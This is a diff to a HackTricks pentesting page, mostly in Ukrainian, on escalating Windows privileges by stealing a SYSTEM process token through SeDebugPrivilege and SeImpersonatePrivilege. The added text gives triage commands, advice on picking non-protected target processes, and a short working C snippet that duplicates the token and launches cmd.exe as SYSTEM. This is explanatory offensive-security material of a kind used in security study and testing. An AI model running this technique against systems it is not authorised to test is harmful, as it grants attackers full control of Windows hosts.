@@ -2,12 +2,76 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Наступний код **використовує привілеї SeDebug та SeImpersonate** для копіювання токена з **процесу, що працює як SYSTEM** і з **усіма привілеями токена**. \
-У цьому випадку цей код можна скомпілювати та використовувати як **бінарний файл служби Windows**, щоб перевірити, чи він працює.\
-Однак основна частина **коду, де відбувається підвищення привілеїв**, знаходиться всередині **функції `Exploit`**.\
-Всередині цієї функції ви можете побачити, що **процес **_**lsass.exe**_** шукається**, потім його **токен копіюється**, і нарешті цей токен використовується для запуску нового _**cmd.exe**_ з усіма привілеями скопійованого токена.
+Ця сторінка описує варіант **manual token-theft**, де контекст **High Integrity**, який уже має **`SeDebugPrivilege`** і **`SeImpersonatePrivilege`**, відкриває відповідний процес **SYSTEM**, **duplicates its token**, і **спawns a new process** з цим токеном.
 
-**Інші процеси**, що працюють як SYSTEM з усіма або більшістю привілеїв токена: **services.exe**, **svhost.exe** (один з перших), **wininit.exe**, **csrss.exe**... (_пам'ятайте, що ви не зможете скопіювати токен з захищеного процесу_). Більше того, ви можете використовувати інструмент [Process Hacker](https://processhacker.sourceforge.io/downloads.php), запущений від імені адміністратора, щоб побачити токени процесу.
+Якщо вам потрібен лише швидкий `SYSTEM` shell із привілейованого admin process, також перевірте:
+
+{{#ref}}
+seimpersonate-from-high-to-system.md
+{{#endref}}
+
+Якщо у вас **немає** path для process-handle, але є **`SeImpersonatePrivilege`**, маршрут **named-pipe / Potato** зазвичай простіший:
+
+{{#ref}}
+named-pipe-client-impersonation.md
+{{#endref}}
+
+{{#ref}}
+roguepotato-and-printspoofer.md
+{{#endref}}
+
+## Quick triage
+
+Перш ніж пробувати token-copy path, переконайтеся, що поточний process уже перебуває в корисному контексті:
+```cmd
+whoami /groups | findstr /i "high mandatory"
+whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
+```
+Notes:
+
+- **`SeDebugPrivilege`** — це те, що дозволяє відкривати багато **не захищених** SYSTEM process навіть тоді, коли їхній DACL зазвичай блокує доступ.
+- **`SeImpersonatePrivilege`** — це те, що робить **`CreateProcessWithTokenW`** практичним після цього.
+- Якщо шлях копіювання token дає лише слабкий або filtered SYSTEM token, просто вкради token з **іншого SYSTEM process**.
+
+## Обирай target process уважно
+
+Цю technique зазвичай показують проти **`lsass.exe`**, але на modern Windows це часто **неправильний target**:
+
+- Якщо увімкнено **LSA Protection / RunAsPPL**, **`lsass.exe`** захищений, і звичайний admin process з `SeDebugPrivilege` усе одно не зможе його відкрити.
+- Краще використовувати **non-PPL SYSTEM processes** такі як **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** або ранній екземпляр **`svchost.exe`**.
+- **Protected processes** і деякі спеціальні process, такі як **`System`** або **`csrss.exe`**, не є реалістичними user-mode target для цієї technique.
+- Використовуй **Process Hacker / Process Explorer**, запущені elevated, щоб перевірити, чи має target token потрібні привілеї, перш ніж дублювати його.
+
+## API details, які мають значення на практиці
+
+Багато public PoC запитують **`PROCESS_ALL_ACCESS`** і **`TOKEN_ALL_ACCESS`**, але це шумніше, ніж потрібно. На практиці:
+
+- Відкривай target process лише з правами, які тобі потрібні (зазвичай **`PROCESS_QUERY_INFORMATION`** або **`PROCESS_QUERY_LIMITED_INFORMATION`**).
+- Відкривай token з правами, потрібними для створення process: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
+- Використовуй **`DuplicateTokenEx(..., TokenPrimary, ...)`**, щоб створити **primary token**; одного impersonation token недостатньо для створення нового process.
+- Якщо **`CreateProcessWithTokenW`** завершується помилкою **`1314`**, переходь на **`CreateProcessAsUserW`**.
+- Якщо запускаєш із **service / Session 0**, пам’ятай, що **`CreateProcessWithTokenW`** залишає child у **session** викликача. Якщо тобі потрібен видимий desktop shell, використовуй **`CreateProcessAsUserW`** і перемісти token у потрібну session.
+
+Мінімальний modern flow виглядає так:
+```c
+HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+HANDLE hTok = NULL, hDup = NULL;
+OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
+DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
+SecurityImpersonation, TokenPrimary, &hDup);
+CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
+L"C:\\Windows\\System32\\cmd.exe",
+NULL, 0, NULL, NULL, &si, &pi);
+```
+## Full service PoC
+
+Наступний код **експлуатує привілеї `SeDebugPrivilege` і `SeImpersonatePrivilege`** для копіювання token з **process, що працює як SYSTEM** і має **всі token privileges**. У цьому випадку код можна скомпілювати й використати як **Windows service binary** для перевірки, що primitive працює.
+
+Основна частина **code, де відбувається elevation**, знаходиться всередині функції **`Exploit`**. Усередині цієї функції видно, що виконується пошук **`lsass.exe`**, його **token копіюється**, і зрештою цей token використовується, щоб запустити новий **`cmd.exe`** з усіма привілеями скопійованого token.
+
+На сучасних hosts часто потрібно замінити **`lsass.exe`** на інший **non-PPL SYSTEM process**, наприклад **`winlogon.exe`**, **`wininit.exe`** або **`services.exe`**.
+
+Інші process, що працюють як SYSTEM з усіма або більшістю token privileges: **`services.exe`**, **`svchost.exe`** (деякі з перших), **`wininit.exe`**, **`csrss.exe`**... Пам’ятайте, що зазвичай ви **не зможете скопіювати token із protected process**.
 ```c
 // From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
 #include <windows.h>
@@ -212,4 +276,8 @@ StartServiceCtrlDispatcher( serviceTable );
 return 0;
 }
 ```
+## Посилання
+
+- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
+- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
 {{#include ../../banners/hacktricks-training.md}}
